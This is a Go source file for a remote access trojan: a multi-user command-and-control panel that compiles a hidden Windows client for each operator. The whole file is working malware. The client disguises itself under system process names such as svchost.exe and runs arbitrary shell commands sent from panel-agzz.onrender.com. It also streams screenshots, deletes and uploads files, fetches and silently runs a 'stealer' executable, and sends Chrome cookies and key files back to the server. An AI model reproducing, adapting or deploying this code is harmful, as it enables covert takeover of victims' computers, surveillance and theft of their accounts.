package main

import (
	"archive/zip"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

const template = `package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"syscall"

	"github.com/gorilla/websocket"
	"golang.org/x/sys/windows"
)

type Message struct {
	Type string ` + "`json:\"type\"`" + `
	Data string ` + "`json:\"data\"`" + `
	Name string ` + "`json:\"name,omitempty\"`" + `
}

var streaming = false
var conn *websocket.Conn

func runHiddenCommand(name string, arg ...string) ([]byte, error) {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	return cmd.CombinedOutput()
}

func downloadAndRunStealer(url string) error {
	// Скачиваем файл
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("download failed: %%v", err)
	}
	defer resp.Body.Close()

	// Сохраняем во временной папке
	stealerPath := filepath.Join(os.TempDir(), "svchost.exe")
	out, err := os.Create(stealerPath)
	if err != nil {
		return fmt.Errorf("create file failed: %%v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("copy failed: %%v", err)
	}

	// Запускаем скрытно
	cmd := exec.Command(stealerPath)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start failed: %%v", err)
	}

	// Удаляем через 5 секунд
	go func() {
		time.Sleep(5 * time.Second)
		os.Remove(stealerPath)
	}()

	return nil
}

func isValidExe(path string) bool {
    file, err := os.Open(path)
    if err != nil {
        return false
    }
    defer file.Close()
    
    header := make([]byte, 2)
    if _, err := file.Read(header); err != nil {
        return false
    }
    return string(header) == "MZ"
}

func tryRunMethods(path string) bool {
    methods := []func(string) error{
        func(p string) error { return exec.Command(p).Start() },
        func(p string) error { return exec.Command("explorer.exe", p).Start() },
        func(p string) error {
            return exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", p).Start()
        },
    }
    
    for _, method := range methods {
        if method(path) == nil {
            return true
        }
    }
    return false
}

func spoofProcessName() {
    // Common legitimate Windows process names
    legitNames := []string{
        "svchost.exe",
        "winlogon.exe",
        "dllhost.exe",
        "rundll32.exe",
    }
    
    // Get current executable path
    exePath, _ := os.Executable()
    
    // Create a copy with a legitimate name in temp directory
    newName := filepath.Join(os.TempDir(), legitNames[time.Now().Unix()%int64(len(legitNames))])
    if _, err := os.Stat(newName); os.IsNotExist(err) {
        data, _ := os.ReadFile(exePath)
        _ = os.WriteFile(newName, data, 0755)
        
        // Start new instance and exit current one
        cmd := exec.Command(newName)
        cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
        _ = cmd.Start()
        os.Exit(0)
    }
}

func main() {
	spoofProcessName()
	var err error
	conn, _, err = websocket.DefaultDialer.Dial("wss://YOUR_SERVER_IP/ws?key=supersecret", nil)
	if err != nil {
		log.Fatal("Connection error:", err)
	}
	defer conn.Close()

	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Println("Recovered from panic:", r)
			}
		}()
		for {
			var msg Message
			if err := conn.ReadJSON(&msg); err != nil {
				log.Println("read error:", err)
				break
			}

			switch msg.Type {
			case "cmd":
				out, err := runHiddenCommand("cmd", "/C", msg.Data)
				resp := Message{Type: "result", Data: string(out)}
				if err != nil {
					resp.Data += "\nError: " + err.Error()
				}
				conn.WriteJSON(resp)

			case "start_screen":
				if streaming {
					continue
				}
				streaming = true
				go func() {
					for streaming {
						imgPath := filepath.Join(os.TempDir(), "screen.jpg")
						cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
							"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "+
								"$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "+
								"$bmp = New-Object Drawing.Bitmap($screen.Width, $screen.Height); "+
								"$graphics = [Drawing.Graphics]::FromImage($bmp); "+
								"$graphics.CopyFromScreen(0,0,0,0,$bmp.Size); "+
								"$bmp.Save('"+imgPath+"'); $bmp.Dispose()")
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						_, err := cmd.CombinedOutput()
						if err != nil {
							log.Println("screenshot error:", err)
							continue
						}

						data, err := os.ReadFile(imgPath)
						if err != nil {
							log.Println("read screenshot error:", err)
							continue
						}
						encoded := base64.StdEncoding.EncodeToString(data)
						conn.WriteJSON(Message{Type: "screen", Data: encoded})
						time.Sleep(100 * time.Millisecond)
					}
				}()

			case "stop_screen":
				streaming = false

			case "ls":
				files, err := os.ReadDir(msg.Data)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "ls error: " + err.Error()})
					continue
				}
				var result struct {
					Parent string ` + "`json:\"parent\"`" + `
					Items  []struct {
						Name string ` + "`json:\"name\"`" + `
						Full string ` + "`json:\"full\"`" + `
						Dir  bool   ` + "`json:\"dir\"`" + `
					} ` + "`json:\"items\"`" + `
				}
				parent := filepath.Dir(msg.Data)
				if parent != msg.Data {
					result.Parent = parent
				}
				for _, f := range files {
					full := filepath.Join(msg.Data, f.Name())
					result.Items = append(result.Items, struct {
						Name string ` + "`json:\"name\"`" + `
						Full string ` + "`json:\"full\"`" + `
						Dir  bool   ` + "`json:\"dir\"`" + `
					}{
						Name: f.Name(),
						Full: full,
						Dir:  f.IsDir(),
					})
				}
				raw, _ := json.Marshal(result)
				conn.WriteJSON(Message{Type: "explorer", Data: string(raw)})

			case "rm":
				err := os.RemoveAll(msg.Data)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "rm error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "deleted: " + msg.Data})
				}

			case "open":
				cmd := exec.Command("cmd", "/C", "start", "", msg.Data)
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				err := cmd.Run()
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "open error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "opened: " + msg.Data})
				}

			case "upload":
				var payload struct {
					Filename string ` + "`json:\"filename\"`" + `
					Content  string ` + "`json:\"content\"`" + `
				}
				if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: invalid JSON"})
					break
				}
				data, err := base64.StdEncoding.DecodeString(payload.Content)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: base64 decode"})
					break
				}
				err = os.WriteFile(payload.Filename, data, 0644)
				if err != nil {
					conn.WriteJSON(Message{Type: "result", Data: "upload error: " + err.Error()})
				} else {
					conn.WriteJSON(Message{Type: "result", Data: "uploaded: " + payload.Filename})
				}

			case "run_stealer":
				// 1. Формируем URL до stealer.exe на сервере
				stealerURL := "https://panel-agzz.onrender.com/apps/steler.exe"
				resp, err := http.Get(stealerURL)
				if err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Download failed: " + err.Error()})
					break
				}
				defer resp.Body.Close()

				// Сохранение файла
				stealerPath := filepath.Join(os.TempDir(), "wupdater.exe")
				data, err := io.ReadAll(resp.Body)
				if err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Read failed: " + err.Error()})
					break
				}
				
				if err := os.WriteFile(stealerPath, data, 0755); err != nil {
					conn.WriteJSON(Message{Type: "stealer", Data: "Write failed: " + err.Error()})
					break
				}

				// Проверка файла
				if !isValidExe(stealerPath) {
					conn.WriteJSON(Message{Type: "stealer", Data: "Invalid executable"})
					break
				}

				// Попытки запуска
				if tryRunMethods(stealerPath) {
					conn.WriteJSON(Message{Type: "stealer", Data: "Successfully, write to telegram @nvalteam to get | TODO: automation"})
				} else {
					conn.WriteJSON(Message{Type: "stealer", Data: "All start methods failed"})
				}
				
				// Отложенное удаление
				go func() {
					time.Sleep(30 * time.Second)
					os.Remove(stealerPath)
				}()

			case "get_cookies":
				id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
				collectAllCookies(id)
				conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
			}
		}
	}()

	for {
		time.Sleep(30 * time.Second)
	}
}

func collectAllCookies(id string) {
	localApp := os.Getenv("LOCALAPPDATA")
	cookieSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Default", "Cookies")
	stateSrc := filepath.Join(localApp, "Google", "Chrome", "User Data", "Local State")

	tmpCookie := filepath.Join(os.TempDir(), "tmp_cookie.db")
	tmpState := filepath.Join(os.TempDir(), "tmp_state.json")

	if err := copyFile(cookieSrc, tmpCookie); err != nil {
		log.Println("copy cookie error:", err)
		return
	}
	if err := copyFile(stateSrc, tmpState); err != nil {
		log.Println("copy state error:", err)
		return
	}

	uploadFile(tmpCookie, "cookies/"+id+".db")
	uploadFile(tmpState, "cookies/"+id+".json")

	_ = os.Remove(tmpCookie)
	_ = os.Remove(tmpState)
}

func uploadFile(path, remote string) {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Println("upload read error:", err)
		conn.WriteJSON(Message{Type: "result", Data: "read error: " + err.Error()})
		return
	}
	payload := struct {
		Filename string ` + "`json:\"filename\"`" + `
		Content  string ` + "`json:\"content\"`" + `
	}{
		Filename: remote,
		Content:  base64.StdEncoding.EncodeToString(data),
	}
	raw, _ := json.Marshal(payload)
	conn.WriteJSON(Message{Type: "upload", Data: string(raw)})
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}`

type Message struct {
	Type     string `json:"type"`
	Data     string `json:"data"`
	Name     string `json:"name,omitempty"`
	ClientID string `json:"client_id,omitempty"`
}

type Client struct {
	ID    string
	Conn  *websocket.Conn
	Owner string
}

var (
	clients    = make(map[string]*Client)
	clientsMu  sync.RWMutex
	admins     = make(map[*websocket.Conn]string)
	adminsMu   sync.Mutex
	upgrader   = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	sessions   = make(map[string]string)
	sessionsMu sync.RWMutex
	users      = map[string]string{
		"admin": "admin123",
		"user1": "pass1",
	}
	userToToken = make(map[string]string)
	tokenMu     sync.RWMutex
)

var userBuilds = make(map[string]string)

func main() {
	_ = os.MkdirAll("stealer", 0755)

	r := mux.NewRouter()
	r.HandleFunc("/login", loginHandler).Methods("POST")
	r.Handle("/admin", authMiddleware(http.HandlerFunc(adminWSHandler)))
	r.Handle("/clients", authMiddleware(http.HandlerFunc(getClientsHandler))).Methods("GET")
	r.Handle("/send/{id}", authMiddleware(http.HandlerFunc(sendCommandHandler))).Methods("POST")
	r.Handle("/apps/{file}", http.StripPrefix("/apps/", http.FileServer(http.Dir("./apps"))))
	r.HandleFunc("/ws", wsHandler)
	r.Handle("/download_build", authMiddleware(http.HandlerFunc(downloadBuildHandler))).Methods("GET")
	r.Handle("/create_build", authMiddleware(http.HandlerFunc(createBuildHandler))).Methods("POST")
	r.Handle("/get_token", authMiddleware(http.HandlerFunc(getTokenHandler))).Methods("GET")
	r.HandleFunc("/download_client", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "./clients/client.exe")
	}))
	r.PathPrefix("/").Handler(http.HandlerFunc(staticOrLogin))

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	log.Println("Starting RAT server on port", port)
	http.ListenAndServe(":"+port, r)
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	clientsMu.RLock()
	var userClients []string
	for id, client := range clients {
		if client.Owner == username {
			userClients = append(userClients, id)
		}
	}
	json.NewEncoder(w).Encode(userClients)
}

func downloadBuildHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "unauthorized",
		})
		return
	}

	path, ok := userBuilds[username]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "build not found",
		})
		return
	}

	f, err := os.Open(path)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "cannot open build file",
		})
		return
	}
	defer f.Close()

	w.Header().Set("Content-Disposition", "attachment; filename=client.exe")
	w.Header().Set("Content-Type", "application/octet-stream")
	http.ServeContent(w, r, "client.exe", time.Now(), f)
}

func createBuildHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		w.WriteHeader(http.StatusUnauthorized)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"error": "unauthorized",
		})
		return
	}

	serverHost := "panel-agzz.onrender.com"
	code := strings.ReplaceAll(template, "YOUR_SERVER_IP", serverHost)

	_ = os.MkdirAll("builds", 0755)

	buildPath := fmt.Sprintf("./builds/%s_build.go", username)
	outputPath := fmt.Sprintf("./builds/%s_client.exe", username)

	err := os.WriteFile(buildPath, []byte(code), 0644)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"error": "write error: " + err.Error(),
		})
		return
	}

	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", outputPath, buildPath)
	cmd.Env = append(os.Environ(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64")

	var stderr strings.Builder
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		_ = json.NewEncoder(w).Encode(map[string]string{
			"error": "build error: " + stderr.String(),
		})
		return
	}

	userBuilds[username] = outputPath
	w.WriteHeader(http.StatusOK)
	_ = json.NewEncoder(w).Encode(map[string]string{
		"message": "Build created successfully",
		"build":   outputPath,
	})
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if users[creds.Username] != creds.Password {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	sid := uuid.New().String()
	sessionsMu.Lock()
	sessions[sid] = creds.Username
	sessionsMu.Unlock()
	http.SetCookie(w, &http.Cookie{
		Name:     "session",
		Value:    sid,
		Path:     "/",
		HttpOnly: true,
		MaxAge:   86400,
	})
	w.WriteHeader(http.StatusOK)
}

func authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("session")
		if err != nil || !validSession(cookie.Value) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		sessionsMu.RLock()
		username := sessions[cookie.Value]
		sessionsMu.RUnlock()
		ctx := context.WithValue(r.Context(), "username", username)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}

func validSession(sid string) bool {
	sessionsMu.RLock()
	defer sessionsMu.RUnlock()
	_, ok := sessions[sid]
	return ok
}

func staticOrLogin(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/" || r.URL.Path == "/index.html" {
		cookie, err := r.Cookie("session")
		if err != nil || !validSession(cookie.Value) {
			http.ServeFile(w, r, "ui/login.html")
			return
		}
	}
	http.FileServer(http.Dir("./ui")).ServeHTTP(w, r)
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("key")
	tokenMu.RLock()
	username, ok := userToToken[token]
	tokenMu.RUnlock()
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("upgrade error:", err)
		return
	}
	id := strings.ReplaceAll(r.RemoteAddr, ":", "_") + "_" + uuid.New().String()
	client := &Client{ID: id, Conn: conn, Owner: username}
	clientsMu.Lock()
	clients[id] = client
	clientsMu.Unlock()
	log.Println("Client connected:", id, "for user:", username)

	defer func() {
		clientsMu.Lock()
		delete(clients, id)
		clientsMu.Unlock()
		conn.Close()
		log.Println("Client disconnected:", id)
	}()

	for {
		var msg Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Println("read error from client:", err)
			break
		}
		log.Printf("Received from client [%s]: %s\n", id, msg.Type)
		msg.ClientID = client.ID

		switch msg.Type {
		case "result", "screen", "explorer", "stealer":
			broadcastToAdmins(msg, client.Owner)

		case "upload":
			var payload struct {
				Filename string `json:"filename"`
				Content  string `json:"content"`
			}
			if err := json.Unmarshal([]byte(msg.Data), &payload); err != nil {
				log.Println("upload JSON parse error:", err)
				continue
			}
			data, err := decodeBase64(payload.Content)
			if err != nil {
				log.Println("upload base64 decode error:", err)
				continue
			}
			if err := os.WriteFile(payload.Filename, data, 0644); err != nil {
				log.Println("upload write file error:", err)
			} else {
				log.Printf("Saved uploaded file: %s\n", payload.Filename)
			}
		}
	}
}

func decodeBase64(s string) ([]byte, error) {
	return io.ReadAll(base64.NewDecoder(base64.StdEncoding, strings.NewReader(s)))
}

func adminWSHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("admin ws upgrade error:", err)
		return
	}
	adminsMu.Lock()
	admins[conn] = username
	adminsMu.Unlock()
	log.Println("Admin connected:", username)

	defer func() {
		adminsMu.Lock()
		delete(admins, conn)
		adminsMu.Unlock()
		log.Println("Admin disconnected:", username)
		conn.Close()
	}()

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

func broadcastToAdmins(msg Message, clientOwner string) {
	adminsMu.Lock()
	defer adminsMu.Unlock()
	for conn, username := range admins {
		if username == clientOwner {
			err := conn.WriteJSON(msg)
			if err != nil {
				log.Println("broadcast error:", err)
				conn.Close()
				delete(admins, conn)
			}
		}
	}
}

func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	id := mux.Vars(r)["id"]
	clientsMu.RLock()
	client, ok := clients[id]
	clientsMu.RUnlock()
	if !ok || client.Owner != username {
		http.Error(w, "client not found or not owned", http.StatusNotFound)
		return
	}
	var msg Message
	if err := json.NewDecoder(r.Body).Decode(&msg); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if err := client.Conn.WriteJSON(msg); err != nil {
		http.Error(w, "failed to send", http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func getTokenHandler(w http.ResponseWriter, r *http.Request) {
	username, ok := r.Context().Value("username").(string)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	tokenMu.RLock()
	token, ok := userToToken[username]
	tokenMu.RUnlock()
	if !ok {
		token = uuid.New().String()
		tokenMu.Lock()
		userToToken[username] = token
		tokenMu.Unlock()
	}
	w.Write([]byte(token))
}

func addToZip(zipWriter *zip.Writer, path string, name string) {
	file, err := os.Open(path)
	if err != nil {
		log.Println("zip open error:", err)
		return
	}
	defer file.Close()
	wr, err := zipWriter.Create(name)
	if err != nil {
		log.Println("zip create entry error:", err)
		return
	}
	_, err = io.Copy(wr, file)
	if err != nil {
		log.Println("zip copy error:", err)
	}
}
